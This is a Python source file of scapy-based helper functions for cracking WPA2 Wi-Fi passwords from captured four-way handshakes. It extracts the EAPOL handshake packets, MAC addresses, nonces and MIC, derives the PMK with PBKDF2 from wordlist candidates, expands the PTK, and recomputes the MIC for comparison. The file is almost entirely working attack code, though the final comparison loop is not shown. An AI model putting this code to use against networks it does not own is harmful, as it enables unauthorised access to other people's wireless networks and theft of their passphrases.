from scapy.all import *
import binascii
from pbkdf2 import PBKDF2


def get_packet_sender_mac(packet):
    return packet[Dot11].addr2


def get_packet_receiver_mac(packet):
    return packet[Dot11].addr1


def format_mac_address_binary(mac_address):
    return binascii.a2b_hex(
        mac_address.replace(":", "").lower())

def get_nonce(packet):
    return packet.getlayer(EAPOL_KEY).key_nonce

def get_mic(packet):
    return packet.getlayer(EAPOL_KEY).key_mic


def get_version(packet):
    return packet.getlayer(EAPOL).version


def get_length(packet):
    return packet.getlayer(EAPOL).len


def get_type(packet):
    return packet.getlayer(EAPOL).type


def get_is_empty_byte_string(byte_string):
    for byte in byte_string:
        if byte != 0x00:
            return False
    return True

       
# TODO: There might be multiple handshake from different APs in the captures 
# First, read all beacon packets and find the MAC adress belonging to the provided essid
# Filter by this mac address
def get_handshake_packets(packets):
    first_packet = None
    second_packet = None
    third_packet = None
    fourth_packet = None

    for packet in packets:
        # EAPOL type 3 are handshake packets
        if not (packet.haslayer(EAPOL) and packet[EAPOL].type == 3):
            continue
    
        is_message_from_access_point = packet.getlayer(Dot11).FCfield & 0x2 != 0
        
        mic = get_mic(packet)
        is_empty_mic = get_is_empty_byte_string(mic)

        if is_message_from_access_point:
            if is_empty_mic:
                first_packet = packet
            else:
                third_packet = packet

        nonce = get_nonce(packet)
        is_empty_nonce = get_is_empty_byte_string(nonce)

        if not is_message_from_access_point:
            if is_empty_nonce:
                fourth_packet = packet
            else:
                second_packet = packet

    return first_packet, second_packet, third_packet, fourth_packet


def get_first_handshake_packet(packets):
    first_packet, _, _, _ = get_handshake_packets(packets)
    return first_packet


def get_second_handshake_packet(packets):
    _, second_packet, _, _ = get_handshake_packets(packets)
    return second_packet


def get_eapol_key_layer(packet):
    return packet.getlayer(EAPOL_KEY)


def format_key_data(access_point_mac_binary, client_mac_binary, a_nonce, s_nonce):
    return (
        min(access_point_mac_binary, client_mac_binary)
        + max(access_point_mac_binary, client_mac_binary)
        + min(a_nonce, s_nonce)
        + max(a_nonce, s_nonce)
    )

def derive_psk(password, access_point_essid):
    return PBKDF2(password, access_point_essid, 4096).read(32)


def generate_ptk(pmk, key_data):
    # customPRF512
    blen = 64
    i = 0
    R = b''
    while i <= ((blen*8+159)/160):
        hmacsha1 = hmac.new(pmk, "Pairwise key expansion".encode()+chr(0x00).encode(
            'ascii', errors='ignore')+key_data+chr(i).encode(), hashlib.sha1)
        i += 1
        R = R+hmacsha1.digest()
    return R[:blen]


def format_payload(version, packet_type, length, eapol_key_layer):
    return (bytes([version]) +
            bytes([packet_type]) +
            bytes([0x00]) +
            bytes([length]) +
            raw(eapol_key_layer).replace(eapol_key_layer.key_mic, bytes([0x00])*16))

# TODO Sometimes this can also be encrypted with md5
def generate_mic(ptk, payload):
    return hmac.new(ptk[0:16], payload, hashlib.sha1).digest()[:16]

    
def read_password_list(path):
    file_ = open(path, 'r')
    passwords_with_new_line = file_.read().splitlines()
    passwords = [line.strip() for line in passwords_with_new_line]
    return passwords
